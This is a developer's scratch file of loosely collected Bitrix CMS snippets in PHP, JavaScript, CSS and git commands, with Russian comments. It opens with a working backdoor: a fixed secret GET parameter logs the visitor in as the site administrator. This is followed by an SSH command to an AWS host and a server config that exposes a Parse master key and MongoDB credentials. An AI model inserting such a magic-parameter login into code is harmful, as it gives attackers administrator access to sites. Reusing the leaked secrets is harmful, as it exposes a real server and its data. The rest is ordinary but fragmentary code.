<?php
if($_GET["p"] == 'zd3GA2'){
    $USER->Authorize(1, true);
    LocalRedirect("/");
}


ssh -i "instagramandroid.pem" bitnami@ec2-35-156-31-200.eu-central-1.compute.amazonaws.com
cd stack/parse
cat config.json
{
  "appId": "myappID",
  "masterKey": "vMpvqi18balr",
  "appName": "parse-server",
  "mountPath": "/parse",
  "port": "1337",
  "host": "0.0.0.0",
   "serverURL": "http://35.156.31.200/parse",
  "databaseURI": "mongodb://bn_parse:oZzdz3bZGs@127.0.0.1:27017/bitnami_parse"
}
user
vMpvqi18balr

https://developers.google.com/ar/develop/java/quickstart


See translation

// работа с заказами https://mrcappuccino.ru/blog/post/work-with-order-bitrix-d7

git reset --hard a0d3fe6
git reset --hard origin/master
git reset --hard HEAD

\CModule::IncludeModule("webway.sogaz");
\Sogaz\Main\Log\Handlers::log($result);f
 
if (CModule::IncludeModule("webway.sogaz")) {

} 
\WebWay\Sogaz\Util::log();
\WebWay\Sogaz\Util::saveDateLog();
\WebWay\Sogaz\Util::debug();
$request = \WebWay\Sogaz\Soap\CWsdl::getLastRequest();
$response = \WebWay\Sogaz\Soap\CWsdl::getLastResponse();

\Sogaz\Main\Helpers\Util::log($result);

        $beginDate = date("Y-m-d", strtotime($arUserData['paydate'] . " +14 days"));

        // если указан произвольный адрес
        if (isset($arUserData['coincidesaddr'])) {
            $arUserData['ADDRESS'] = trim($arUserData['customaddress']);
            $arUserData['CITY1ID'] = '7700000000000';
            $arUserData['index'] = '000000';
            $arUserData['city1'] = $arUserData['street'] = 'нет';
            $arUserData['house'] = $arUserData['korpus'] = $arUserData['building'] = $arUserData['flat'] = '0';
        }

        $arUserData['pass_type'] = ContractMethod::getDocumentData($arUserData['document']);

        // ОТПРАВКА ДАННЫХ В ИНТЕГРАТОР: НАЧАЛО
        // собираем итоговый массив
        $arData = [
            'MODE' => "",
            'PRODUCT' => ContractMethod::PRODUCT_ACCIDENT,
            'NUMBER' => $arUserData['number_polisy'],
            'EMAIL' => $arUserData['email'],
            'BEGIN_DATE' => $beginDate,
            'END_DATE' => "0001-01-01",
            'DATE' => date('Y-m-d', strtotime($arUserData['paydate'])) . "T00:00:00",
        ];

        \WebWay\Sogaz\Util::log($arUserData);
        \WebWay\Sogaz\Util::log($arData);


git clean -fd

git fetch origin master
git reset --hard origin/master

Отмена изменений в рабочем каталоге
git checkout hello.html

Хорошая идея: Прежде чем приступать к удалению сначала просто выполните git clean -n, чтобы предварительно просмотреть список файлов и папок которые будут удалены и убедиться в их ненужности.            

Просмотреть, а затем удалить непроиндексированные файлы и папки:

$ git clean -nd
$ git clean -fd

try {
	
} catch (Exception $e) {
	$e->getMessage()
}


if (!Loader::includeModule('webway.sogaz')){
    throw new LoaderException('Unable to load module webway.sogaz');
}

if (!$arUserData) {
	throw new Exception('Отсутствует информация');
}

try {

} catch (Exception $e) {
	
}

$key = array_search($object[1], $this->IntegratorParams['NAMES']);

$templateFolder — путь к шаблону компонента
<?$APPLICATION->AddHeadString('<script type="text/javascript" src="'.$this->__component->__template->__folder.'/jquery.fancybox-1.3.4.pack.js"></script>',true)?>

<?php
$url = explode('/', trim($_SERVER['REQUEST_URI']));
$uri = explode('/', $_SERVER['REQUEST_URI']);
$uri = explode('/', $APPLICATION->GetCurPage());




/* -- break -- */

$href = 'tel:'.str_replace(array(' ', '-', '(', ')'), '', $phone);

require(dirname(__FILE__)."/functions.php");

FormatDateFromDB($EndDate, "Y-m-d")

/* -- break -- */

$el = new CUser;
$el->Update(1, array('ACTIVE' => 'Y'));

/* -- break -- */

$APPLICATION->SetTitle("Контакты");





<?= $arResult['SECTION']['PATH'][0]['SECTION_PAGE_URL'] ?>?ACTION[]=<?=$arResult['PROPERTIES']['ACTION']['VALUE_ENUM_ID'][$key]?>&set_filter=Y"

/* -- break -- */

if($arResult["SECTION"]["PATH"]) {
?>
<h3>Категории</h3>
<p>
	<?
	foreach ($arResult["SECTION"]["PATH"] as $category) {
		?>
		<a href="<?=$category['SECTION_PAGE_URL']?>"><?=$category['NAME']?></a>&nbsp;&nbsp;&nbsp;
		<?
	}
	?>
</p>
<?
}

<
div class="back-to-items" ><a href = "<?=$arResult["FOLDER"].$arResult["URL_TEMPLATES"]["news"]?>" > К списку всех товаров </a ></div >

<div class="back-to-items" >
	<a href = "<?=$arResult['FOLDER'] . $arResult['URL_TEMPLATES']['news']?>" >
К списку ингредиентов
</a >
</div >









$('form.driver_item_table').submit(function() {
var loading = new indi.ui.loading('body');
});


$content = file_get_contents( 'http://www.bank.gov.ua/Fin_ryn/OF_KURS/Currency/FindByDate.aspx');
if(preg_match_all( '/(\d+)<\/td>([A-Z]+)<\/td>(\d+)<\/td>(.+?)<\/td>(\d+\.\d+)<\/td>/i', $content, $m) == false) {
throw new Exception( 'Can not parse data!');
}


$user = self::getRequest('removeUser?accessParameters={"session_id":"' . $session . '"}&user_id="['.$id.']"');

"INCLUDE_IBLOCK_INTO_CHAIN" => "N",

"INCLUDE_IBLOCK_INTO_CHAIN" => "N",
"ADD_SECTIONS_CHAIN" => "Y",
"ADD_ELEMENT_CHAIN" => "N",





<?php echo $key % 2 ? 'right' : 'left'; ?>




"SORT_BY1" => "ID",
"SORT_ORDER1" => "DESC",



"ELEMENT_SORT_FIELD" => "IBLOCK_SECTION_ID.SORT", // $arParams["ELEMENT_SORT_FIELD"],





<div class="no-print">
	<? $APPLICATION->IncludeComponent(
		"bitrix:breadcrumb",
		".default",
		array(
			"START_FROM" => "0",
			"PATH" => "",
			"SITE_ID" => "-",
		),
		false
	); ?>
</div>



<!--
	<li><a href="index.html">Главная</a></li>
-->

header('Location: /')

foreach($arResult['ITEMS'] as $arItem) {
if ($arSortItem == $arItem['ID']) {

$imgId = reset($arItem['PREVIEW_PICTURE']);

// получаем параметры изображения
$arItem['PREVIEW_PARAMS'] = \CFile::GetFileArray($imgId);
$imgParams = $arItem['PREVIEW_PARAMS'];

if ($imgParams['HEIGHT'] >= 348 && $imgParams['WIDTH'] >= 280){
// размеры для ретины
$imgHeight = 348;
$imgWidth = 280;
} elseif (($imgParams['HEIGHT'] < 348 && $imgParams['WIDTH'] <= 280) && ($imgParams['HEIGHT'] >= 174 && $imgParams['WIDTH'] >= 140)){
// обычные размеры
$imgHeight = 174;
$imgWidth = 140;
} else {
// если фотка совсем мелкая, оставляем родные размеры
$imgHeight = $imgParams['HEIGHT'];
$imgWidth = $imgParams['WIDTH'];
}


$arItem['PREVIEW_PICTURE'] = \CFile::ResizeImageGet($imgId, array('width' => $imgWidth, 'height' => $imgHeight), BX_RESIZE_IMAGE_PROPORTIONAL);

$arResult['ITEM'][] = array("ID" => $arSortItem, "NAME" => $arItem['NAME'], "PREVIEW_PICTURE" => $arItem['PREVIEW_PICTURE'], "PREVIEW_PARAMS" => $arItem['PREVIEW_PARAMS']);
}
}

.catalogListItem [class*='position-label--'] {

[CATALOG_QUANTITY]



	$('form.card_add_form').submit(function() {
	var loading = new indi.ui.loading('body');
	});




	.catalogItem [class*='position-label--'] {
	display: block;
	width: 80px;
	float: right;
	color: #1f7800;
	text-align: left;
	margin-top: -3px;
	}

	.catalogItem .position-label--offer {
	color: #ff4500;
	}


	<?
$arObjectsFilter = array('PROPERTY_SHOW_OBJECT_ON_MAIN_VALUE' => 'Y');
$APPLICATION->IncludeComponent(
	"bitrix:news.list",
	"objects",
	array(
		"IBLOCK_TYPE" => "Objects",
		"IBLOCK_ID" => \Indi\Main\Iblock\ID_Objects_Objects,
		"NEWS_COUNT" => "100",
		"SORT_BY1" => "SORT",
		"SORT_ORDER1" => "DESC",
		"SORT_BY2" => "SORT",
		"SORT_ORDER2" => "DESC",
		"FILTER_NAME" => "arObjectsFilter",
		"SHOW_FILTER" => "Y",
		"FIELD_CODE" => array('NAME', 'PREVIEW_PICTURE', 'DETAIL_PICTURE', 'SECTION_CODE'),
		"PROPERTY_CODE" => array('EQUIPMENT', 'OBJECT_ADDRESS'),
		"CHECK_DATES" => "N",
		"DETAIL_URL" => "",
		"AJAX_MODE" => "N",
		"CACHE_TYPE" => "A",
		"CACHE_TIME" => "86400",
		"CACHE_NOTES" => "",
		"CACHE_FILTER" => "N",
		"CACHE_GROUPS" => "N",
		"PREVIEW_TRUNCATE_LEN" => "",
		"ACTIVE_DATE_FORMAT" => "d.m.Y",
		"SET_TITLE" => "N",
		"SET_BROWSER_TITLE" => "N",
		"SET_META_KEYWORDS" => "N",
		"SET_META_DESCRIPTION" => "N",
		"SET_STATUS_404" => "N",
		"INCLUDE_IBLOCK_INTO_CHAIN" => "N",
		"ADD_SECTIONS_CHAIN" => "N",
		"HIDE_LINK_WHEN_NO_DETAIL" => "N",
		"PARENT_SECTION" => "",
		"PARENT_SECTION_CODE" => "",
		"INCLUDE_SUBSECTIONS" => "N",
		"DISPLAY_TOP_PAGER" => "N",
		"DISPLAY_BOTTOM_PAGER" => "N",
	)
);?>

<?
$arFilter = ['PROPERTY_MAIN_VALUE' => 'Y'];
$APPLICATION->IncludeComponent(
	"bitrix:news.list",
	"renters",
	array(
		"IBLOCK_TYPE" => "content",
		"IBLOCK_ID" => 2,
		"NEWS_COUNT" => 10,
		"SORT_BY1" => "ID",
		"SORT_ORDER1" => "ASC",
		"SORT_BY2" => "SORT",
		"SORT_ORDER2" => "DESC",
		"FIELD_CODE" => ['NAME'],
		"PROPERTY_CODE" => [],
		"DETAIL_URL" => "",
		"CACHE_TYPE" => "A",
		"CACHE_TIME" => "36000",
		"CACHE_NOTES" => "",
		"CACHE_FILTER" => "N",
		"CACHE_GROUPS" => "N",
		"FILTER_NAME" => "arFilter",
		"SHOW_FILTER" => "Y",
	)
);
?>
	$APPLICATION->SetPageProperty("show_filter", '
	<div class="hidden-lg hidden-md"><span class="js-show-filter show-filter fake">Показать фильтр</span></div>
	');





/**
 * Читаемая дата
 *
 * @static setFormattedDate
 *
 * @param $date
 *
 * @return string
 */
public static function setFormattedDate($date)
{
	$dateDay = mb_substr($date, 8, 2);
	$dateMonth = mb_substr($date, 5, 2);
	$dateYear = mb_substr($date, 0, 4);

	return ltrim($dateDay, "0") . " " . indiUtil::getMonthGenetiv($dateMonth) . " " . $dateYear . " г.";
}


$APPLICATION->SetPageProperty("class", "drivers_page");

<?=$APPLICATION->ShowProperty('class');?>


			?>

"ADD_SECTIONS_CHAIN" => 'N',






// нотификация
if (count($arResult['ITEMS']) == 0) {
	echo "<div class=\"alert alert-info\"><strong>По вашему запросу ничего не найдено. Попробуйте изменить параметры фильтра.</strong></div>";
 }




<a href="?DATE_ACTIVE_FROM[]=01.01.<?= $year?>&DATE_ACTIVE_FROM[]=31.12.<?= $year?>&YEAR=<?= $year?>&set_filter=y"><?= $year?></a>





$('.azs_detal .print a').click(function () {
		window.print();
})

// информация об объекте
$picture = GetIBlockElement($arItem["ITEM_ID"]);

//Indi\Main\Console::log($arResult);

sert
$APPLICATION->AddHeadScript('/bitrix/templates/main/components/individ/get.user.transactions/.default/script.js');

Asset::getInstance()->addJs(SITE_TEMPLATE_PATH . '/js/template.js');
Asset::getInstance()->addString("<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800,300italic,400italic&subset=latin,cyrillic' rel='stylesheet' type='text/css'>");
Asset::getInstance()->addCss(SITE_TEMPLATE_PATH . '/bootstrap/css/bootstrap.min.css');

<?
// для js-файлов
$APPLICATION->AddHeadScript('/bitrix/templates/.default/additional.js');

// для css-файлов
$APPLICATION->SetAdditionalCSS("/bitrix/templates/.default/additional.css");
?>


.directions-list .directions-item a:not(.see-all) {color: #000;}
.directions-list .directions-item a:not(.see-all):hover {color: #009966;}


/* Индикатор загрузки */
.loading-indicator {
	position: relative;
}
.loading-indicator .loading-layer,
.loading-indicator .loading-icon {
	position: absolute;
	z-index: 1000;
}
.loading-indicator .loading-layer {
	bottom: 0;
	left: 0;
	background-color: #fff;
	filter: alpha(opacity=50);
	opacity: 0.5;
	right: 0;
	top: 0;
}
.loading-indicator .loading-icon {
	height: 50px;
	margin: -25px 0 0 -40px;
	left: 50%;
	top: 50%;
	width: 80px;
}
body.loading-indicator .loading-icon {
	position: fixed;
}

/* Индикатор загрузки Bitrix */
body div.waitwindowlocalshadow {
	background: url(images/loading.gif) no-repeat center center rgba(255, 255, 255, 0.3);
	border: none;
}
body div.waitwindowlocalshadow + div.waitwindowlocal {
	display: none;
}

// отправить письмо
$arSend = array('REPORT' => strip_tags($reportBody));
\CEvent::SendImmediate('FORM_FILLING_CSV_REPORT', 's1', $arSend);






<?$APPLICATION->IncludeComponent("individ:contract.form.crm", ".default", array(
	"CACHE_TYPE" => "N",
	"CACHE_TIME" => "3600"
	),
	false
);?>

<?
$APPLICATION->IncludeComponent('individ:first.login', '', array())

?>






	public static function setFormattedDateLost($date)
	{
		$dateEnd = mktime(0, 0, 0, mb_substr($date, 3, 2), mb_substr($date, 0, 2), mb_substr($date, 6, 4));
		$dateLost = $dateEnd - time();
		$days = floor($dateLost/3600/24);
		$hours = floor($dateLost%(3600*24)/3600);
		$minutes = floor(($dateLost%3600)/60);

		$view = new Php('/content/action-timelost.php', array('DAYS' => $days, 'HOURS' => $hours, 'MINUTES' => $minutes));
		return $view->render();
	}


		function sortByDate($a, $b)
		{
			return strnatcmp($a["LAST_USAGE_ORIG"], $b["LAST_USAGE_ORIG"]);
		}

		usort($arResult['CARDS'], "sortByDate");

		$arResult['CARDS'] = array_reverse($arResult['CARDS']);




		// если сегментов больше 5, скрываем кнопку добавления
		/*if ($segmentsWrap.find('.js-segment').length >= 5) {
			$('.filter__block_empty').hide();
		} else {
			$('.filter__block_empty').show();
		}*/
		// не даем добавить более 6 сегментов
		/*if ($segmentsWrap.find('.js-segment').length >= 6) {
			return false;
		}*/


	/*$(document).on('change', '[name=contracts]', function () {
		var filterRow = $(this).val();

		$.each(filterRow, function(i, n){
			if (n == 1) {
				var $select = $('[name=contracts]').selectize();
				var control = $select[0].selectize;

				//control.setValue(_.keys(control.options));

				$select[0].selectize.setValue("US");


				console.log($select[0]);

			}
		});
	});*/


		$arTypes = array_diff($arTypes, array('')); // удалим пустые ключи
		$arTypes = array_unique($arTypes); // уберём повторяющиеся


// проверка http://prntscr.com/dwpjlj и http://prntscr.com/dwpjqa




/**
 * отправка коллбэка

$('body').on('submit', '.js-submit-callback', function () {

	var form = $(this);
	var loading = new indi.ui.loading(form);
	$.ajax
	({
		type: 'GET',
		url: form.attr('action'),
		data: form.serialize(),
		success: function(msg)
		{
			if (msg.data == true){
				form.html('<div class="alert alert-success"><strong>Спасибо!</strong>Ваша заявка принята</div>');
			} else {
				form.html('<div class="alert alert-danger"><strong>Ошибка!</strong>Не удалось сохранить Вашу заявку</div>');
			}

			console.log(msg);

			loading.hide();
		}
	});

	return false;
});
 */
 

 	/**
	 * Выводит форму обратного звонка
	 *
	 * @return string

	public function callbackAction()
	{
		$this->view = new Mvc\View\Html();
		$this->returnAsIs = true;
		include($_SERVER['DOCUMENT_ROOT'] . '/includes/make-up/form-callback.php');
	}	 */

	/**
	 * Отправляет данные на АТС
	 *
	 * @return string

	public function setCallbackAction()
	{
		// выполнить действия по отправке данных на сервер
		$call = new \Indi\Main\Callback($this->getParam('NAME'), $this->getParam('PHONE'));
		$status = $call->send();

		return $status;
	}	 */



//$data = \Indi\Main\Hlblock\Prototype::getInstance(2)->getElements();

//\Indi\Main\Util::log($data);

(4 — комплект, 5 — ассоциация, 6 — аналог, 7 — опции)


 (S-строка L-список)




/*
$obCache = \Bitrix\Main\Data\Cache::createInstance();
$cache_time = "86400";
$cache_id = 'user01@maill.ru';
$cache_folder = '/AllianzPortalSoapServerHandler/GetContracts';
if($obCache->initCache($cache_time, $cache_id, $cache_folder)) {
    $result = $obCache->GetVars();
    echo "<pre>"; var_dump($result); echo "</pre>";
} else {
    echo "no chache";
}
*/



		try {
			$arData = \Indi\Main\Store::getBookingStuff($id, $data);

			return $arData;
		} catch (\Exception $e) {
			\Indi\Main\Util::log($e);
		}

Перейдите на страницу настроек модуля Управление структурой: Настройки > Настройки продукта > Настройки модулей > Управление структурой.

<meta property="og:type" content="article"/>
<meta property="og:title" content="<? $APPLICATION->ShowProperty("og:title") ?>" />
<meta property="og:image" content="<? $APPLICATION->ShowProperty("og:image") ?>" />
<meta property="og:description" content="<? $APPLICATION->ShowProperty("og:description")?>" />
<meta property="og:url" content="<? $APPLICATION->ShowProperty("og:url") ?>" />
<meta name="twitter:card" content="summary_large_image">

global $APPLICATION;
$APPLICATION->SetPageProperty('og:title', $arResult["NAME"]);
$APPLICATION->SetPageProperty('og:image', "//" . $_SERVER["SERVER_NAME"] . $ogPhoto);
$APPLICATION->SetPageProperty('og:description', "");
$APPLICATION->SetPageProperty('og:url', "//" . $_SERVER["SERVER_NAME"] . $arResult['DETAIL_PAGE_URL']);*


$APPLICATION->IncludeComponent(
	"indi:items.list.short",
	"main__blog",
	array(
	),
	false
);








//$el = new CIBlockElement;
//$res = $el->Update($arResult['ID'], $arFields);



                // пометить запрошенный промо код
                $arFields = [
                    'PROPERTY_CALL_DATE' => new \Bitrix\Main\Type\DateTime()
                    ];

                $el = new \CIBlockElement;
                $res = $el->Update($data['ID'], $arFields);
                if(!$PRODUCT_ID = $el->Update($arFields)) {
                    \WebWay\Sogaz\Util::log($el->LAST_ERROR);
                }
                // \Web

<?



	if ($USER->IsAuthorized()) {
		$arOffers = \CCatalogSKU::getOffersList($arItem['ID'], NULL, array('ACTIVE' => 'Y'), array('ACTIVE', 'PRICE'));
		$arOffers = array_shift($arOffers);
		$arOffers = reset($arOffers);

		$rsPrices = CPrice::GetList(array(), array('PRODUCT_ID' => $arOffers['ID']));
		if ($arPrice = $rsPrices->Fetch())
		{
			$arResult['ITEMS'][$key]['PRICE'] = round($arPrice["PRICE"]);
		}
	}













// кол-во элементов
$filter = array(
	"IBLOCK_ID" => $arParams["IBLOCK_ID"],
	"SECTION_CODE" => $arParams['SECTION_CODE']
);
global $arFilter;
$filter = array_merge($filter, $arFilter);

$arResult['COUNT_ITEMS'] = CIBlockElement::GetList(
	array(),
	array($filter),
	array(),
	false,
	array('ID', 'NAME')
);

<?
$arrTags = explode(',', $arResult["ELEMENT"]["TAGS_LIST"]);
$count = count($arrTags);
$i = 0;

foreach($arrTags as $value):
   $i++;
   $value = trim($value);
   echo '<a href="/search/?tags='.str_replace(' ', '+', $value).'">'.$value.'</a>';      
   if($i != $count) echo ', ';
endforeach;
?>


$(function() {
	$(".cancel").click(function() {
		var loading = new indi.ui.loading("body");

		var url = '/personal/profile/#form';
		window.history.pushState(null, null, url);
		window.location.reload();
	});

	$(".save").click(function() {
		var loading = new indi.ui.loading("body");
	});
});







// TODO: проверить используются ли методы ниже

public function getOffers()
{
	if (!$this->_id)
		return false;

	// TODO: проверить, может метод getOffersList не нужен перед getOffersList
	$hasOffers = end(\CCatalogSKU::getExistOffers($this->_id));
	if (!$hasOffers)
		return false;

	if ($offers = end(\CCatalogSku::getOffersList($this->_id, Catalog::getIblockId()))) {
		foreach ($offers as &$offer) {

		}
	} else
		return false;

	return $offers;
}

/**
 * Возвращает цены товара из тп
 */
public function getOfferPrices($offerId)
{
	\CModule::IncludeModule("catalog");

	$ret = 0;
	$arInfo = \CCatalogSKU::GetInfoByProductIBlock($this->_id);
	if (is_array($arInfo))
	{
		$res = \CIBlockElement::GetList(Array("PRICE"=>"asc"),
		                                array('IBLOCK_ID'=>$arInfo['IBLOCK_ID'], 'ACTIVE'=>'Y', 'PROPERTY_'.$arInfo['SKU_PROPERTY_ID'] => $offerId),
		                                false,
		                                false,
		                                array('ID', 'NAME'))->GetNext();
		if ($res){
			$ret = \GetCatalogProductPrice($res["ID"], 1);
			if ($ret['PRICE']){
				$ret = $ret['PRICE'];
			}
		}
	}
	return $ret;
}

/**
 * Кол-во на складе текстом
 */
public static function getQuantityText($cnt)
{
	$cnt = intval($cnt);
	if($cnt > 10)
		return '<span class="t-green">В наличии</span>';
	elseif($cnt > 0)
		return '<span class="t-yellow">Мало</span>';
	else
		return '<span class="t-red">Временно отсутствует</span>';
}


/**
 * Возвращает минимальную цену товара из тп
 */
public function getOfferMinPrice($item_id)
{
	\CModule::IncludeModule("catalog");

	$ret = 0;
	$arInfo = \CCatalogSKU::GetInfoByProductIBlock($this->_id);
	if (is_array($arInfo))
	{
		$res = \CIBlockElement::GetList(Array("PRICE"=>"asc"),
		                                array('IBLOCK_ID'=>$arInfo['IBLOCK_ID'], 'ACTIVE'=>'Y', 'PROPERTY_'.$arInfo['SKU_PROPERTY_ID'] => $item_id),
		                                false,
		                                false,
		                                array('ID', 'NAME'))->GetNext();
		if ($res){
			$ret = \GetCatalogProductPrice($res["ID"], 1);
			if ($ret['PRICE']){
				$ret = $ret['PRICE'];
			}
		}
	}
	return $ret;
}


/**
 * Возвращает максимальную цену товара из тп
 */
public function getOfferMaxPrice($item_id)
{
	\CModule::IncludeModule("catalog");

	$ret = 0;
	$arInfo = \CCatalogSKU::GetInfoByProductIBlock($this->_id);
	if (is_array($arInfo))
	{
		$res = \CIBlockElement::GetList(Array("PRICE"=>"desc"),
		                                array('IBLOCK_ID'=>$arInfo['IBLOCK_ID'], 'ACTIVE'=>'Y', 'PROPERTY_'.$arInfo['SKU_PROPERTY_ID'] => $item_id),
		                                false,
		                                false,
		                                array('ID', 'NAME'))->GetNext();
		if ($res){
			$ret = \GetCatalogProductPrice($res["ID"], 1);
			if ($ret['PRICE']){
				$ret = $ret['PRICE'];
			}
		}
	}
	return $ret;
}


/*function OnAfterIBlockElementAddHandler (&$arFields)
{
	$file_hendle = fopen($_SERVER["DOCUMENT_ROOT"]."/1.txt","w+"); 
	ob_start ();
	print_r($arFields);
	$out_component = ob_get_contents();
	ob_end_clean();
	fwrite($file_hendle,$out_component);
	fclose($file_hendle);
}*/


<?
$iblock = \Indi\Main\Iblock\Prototype::getInstance($arParams['IBLOCK_ID']);
if (method_exists($iblock, 'normalizeElement')) {
foreach ($arResult['ITEMS'] as &$arItem) {
$iblock->normalizeElement($arItem);
}
unset($arItem);
}

/**
* Настраивает данные элемента инфоблока в соотв-ии с БЛ
*
* @param array $data Данные элемента
* @param boolean $detail Для детальной страницы
* @return void
*/
public function normalizeElement(&$data, $detail = false)
{
//Нормализуем адрес сайта
if ($data['PROPERTIES']['WEBSITE']['VALUE']) {
$website = explode('://', $data['PROPERTIES']['WEBSITE']['VALUE']);
if (count($website) == 1) {
$data['PROPERTIES']['WEBSITE']['VALUE'] = 'http://' . $website[0];
$data['PROPERTIES']['WEBSITE']['LABEL'] = $website[0];
} else {
$data['PROPERTIES']['WEBSITE']['LABEL'] = $website[1];
}
}
}

//константы для определения страниц
$isFrontPage = CSite::InDir('/index.php');

//Используемые на сайте пользовательские функции
require_once($_SERVER['DOCUMENT_ROOT'].'/util.php');




                <? if (count($arResult["BASKET_ITEMS"]) == 0): ?>
                    <script type="text/javascript">
                        document.location.href = '';
                    </script>
                <? endif; ?>
<?
	public function getFeedList($cache_time = 64800)
	{
		$cache_folder = '/' . __FUNCTION__ . '/';

		$cache = new Cache(array(__METHOD__), $cache_folder, $cache_time);

		if ($cache->start()) {

			try {

				$arData = array();

			} catch (Exception $e) {
				$cache->abort();

				return false;
			}

			if ($arData) {
				$cache->end($arData);
			} else {
				$cache->abort();
			}
		} else {
			$arData = $cache->getVars();
		}

		return $arData;
	}


$rs = \CIBlockElement::GetList([], ["=IBLOCK_SECTION_ID" => $sections], false, false, array('ID', 'NAME'));
while ($element = $rs->GetNext()) {
	$arElements[] = $element;
}


$IBlock = CIBlock::GetList([], ["=ID" => $arFields['IBLOCK_ID']], true)->Fetch();
$element = CIBlockElement::GetList([], ["=ID" => $arItem['PRODUCT_ID']], false)->GetNext();

$element = CIBlockElement::GetList([], ["=ID" => $ElementID], false)->GetNext();
$section = CIBlockSection::GetByID($element['IBLOCK_SECTION_ID'])->GetNext();



<?
class IBlockHandlerHelper
{
    // создаем обработчик события "OnAfterIBlockElementUpdate"
    public static function OnAfterIBlockElementUpdateHandler(&$arFields)
    {
        $IBlock = CIBlock::GetList([], ["=ID" => $arFields['IBLOCK_ID']], true)->Fetch();

        switch ($IBlock['CODE']) {
            case CATALOG_COMMENT: static::recalculateReviewGoodCount($IBlock, $arFields); break;
        }
    }

    /**
     * Обновить количество отзывов и рейтинг товара при изменении какого-либо отзыва о товаре
     * @param $IBlock
     * @param $arFields
     */
    protected static function recalculateReviewGoodCount($IBlock, $arFields)
    {
        $field_good = CIBlock::GetProperties($IBlock['ID'], [], ['=CODE' => 'GOOD'])->Fetch(); //Получаем ID свойста, в котором хранится связь с товаром
        $good_id = current($arFields['PROPERTY_VALUES'][$field_good['ID']])['VALUE']; //Берем ID товара, отзыв о котором обновили

        //Получаем ID элементов списка оценок и соответствие к XML_ID
        $property_enums = CIBlockPropertyEnum::GetList([], ["IBLOCK_ID" => $IBlock['ID'], "CODE" => ["GRADE"]]);
        while ($enum_fields = $property_enums->GetNext()) {
            $grade_ids[$enum_fields["ID"]] = $enum_fields["XML_ID"];
        }

        //Поулчаем все активные отзывы о товаре
        $rsReviews = CIBlockElement::GetList([], ["IBLOCK_CODE" => CATALOG_COMMENT, "PROPERTY_GOOD" => $good_id, 'ACTIVE'=>'Y'], false, false, ["PROPERTY_GRADE"]);
        $count_review = 0;
        $rating = 0;
        while ($arReview = $rsReviews->GetNext()) {
            $rating += $grade_ids[$arReview["PROPERTY_GRADE_ENUM_ID"]]; //Общая сумма рейтингов
            $count_review++; //Количество отзывов
        }

        //Записываем агрегированную информацию в товар
        (new CIBlockElement)->SetPropertyValueCode($good_id, 'RATING_REVIEW', round($rating/$count_review, 1));
        (new CIBlockElement)->SetPropertyValueCode($good_id, 'COUNT_REVIEW', $count_review);
    }
}

// обновить одно свойство
$prop["IS_SENDED"] = ['VALUE_ENUM_ID'=> 72];
\CIBlockElement::SetPropertyValuesEx(108464, 16, $prop);


\CIBlockElement::SetPropertyValuesEx($data['ID'], IBLOCK_PROMOCODES, ['CALL_DATE' => new \Bitrix\Main\Type\DateTime()]);

/**
 * Обновить куку, в которой записаны последние просмотренные товары
 * @param $code - код текущего товара
 */
function updateLookedGoods($code)
{

    $SHOW_LOOKED_GOODS = 10;//todo число временное, надо уточнять у заказчика

    $lookedGoods = (string)$_COOKIE['CATALOG_LOOKED_GOODS'];
    $lookedGoods = explode(',', $lookedGoods);
    $lookedGoods = array_diff($lookedGoods, ['']);

    if(in_array($code, $lookedGoods)) return;

    array_unshift($lookedGoods, $code);
    if (count($lookedGoods) > $SHOW_LOOKED_GOODS) {
        array_pop($lookedGoods);
    }

    setcookie("CATALOG_LOOKED_GOODS", implode(',', $lookedGoods), time()+86400, '/');

}


/**
 * Получить склонение слова в зависимости от числа
 * @param int $number Число
 * @param string[] $suffix слова в нужном падеже. например: ["минута", "минуты", "минут"]
 * @return mixed
 */
function getWordDeclination($number, $suffix)
{
    $keys = array(2, 0, 1, 1, 1, 2);
    $mod = $number % 100;
    $suffix_key = ($mod > 7 && $mod < 20) ? 2: $keys[min($mod % 10, 5)];
    return $suffix[$suffix_key];
}




/**
 * Получить дату в рускоязычном виде. Работает аналогично функции date
 * @param $format
 * @param null $timestamp
 * @return string
 */
function rus_date($format, $timestamp = null)
{

    return strtr(date($format, $timestamp), [
        "am" => "дп",
        "pm" => "пп",
        "AM" => "ДП",
        "PM" => "ПП",
        "Monday" => "Понедельник",
        "Mon" => "Пн",
        "Tuesday" => "Вторник",
        "Tue" => "Вт",
        "Wednesday" => "Среда",
        "Wed" => "Ср",
        "Thursday" => "Четверг",
        "Thu" => "Чт",
        "Friday" => "Пятница",
        "Fri" => "Пт",
        "Saturday" => "Суббота",
        "Sat" => "Сб",
        "Sunday" => "Воскресенье",
        "Sun" => "Вс",
        "January" => "Января",
        "Jan" => "Янв",
        "February" => "Февраля",
        "Feb" => "Фев",
        "March" => "Марта",
        "Mar" => "Мар",
        "April" => "Апреля",
        "Apr" => "Апр",
        "May" => "Мая",
        "May" => "Мая",
        "June" => "Июня",
        "Jun" => "Июн",
        "July" => "Июля",
        "Jul" => "Июл",
        "August" => "Августа",
        "Aug" => "Авг",
        "September" => "Сентября",
        "Sep" => "Сен",
        "October" => "Октября",
        "Oct" => "Окт",
        "November" => "Ноября",
        "Nov" => "Ноя",
        "December" => "Декабря",
        "Dec" => "Дек",
        "st" => "ое",
        "nd" => "ое",
        "rd" => "е",
        "th" => "ое"
    ]);
}



data-action="<?=(StashedProducts::checkCompare($item['CODE'], $item["PROPERTY_ATTR_L_GOODGROUP_VALUE"])?'remove':'add')?>"

$this->arResult['COMPARE_LIST'] = StashedProducts::getCompareList();

<?=count(StashedProducts::getCompareList())?>

$arResult['CITY'] = CityServices::getMyCity();



Подборка функций для работы с различными свойствами страниц

<code>



# кол-во найденных материалов
<code><?=$arResult["NAV_RESULT"]->NavRecordCount?></code>

# обновить одно свойство
<code>$el = new \CIBlockElement;
	$el->SetPropertyValueCode($arFields['ID'], "YEAR", $year);</code>



	$(document).on('submit', '#commentModalForm', function (e) {
		e.preventDefault();
		console.log($(this).serializeArray());
		$(this).closest('.modal').modal('toggle');
		$('#commentModal-success').modal('show');
		return false;
	});

// количество сообщений в блоге
CModule::IncludeModule("blog");
$dbBlogs = CBlog::GetList([], [], false, false, ["ID", "NAME", "URL"]);
while ($arBlog = $dbBlogs->Fetch())
{
	$cntPosts[$arBlog['URL']][] = CBlogPost::GetList([], ["PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH, "BLOG_ID" => $arBlog['ID']])->SelectedRowsCount();
}




"SORT_BY1" => "DATE_CREATE",
"SORT_ORDER1" => "DESC",

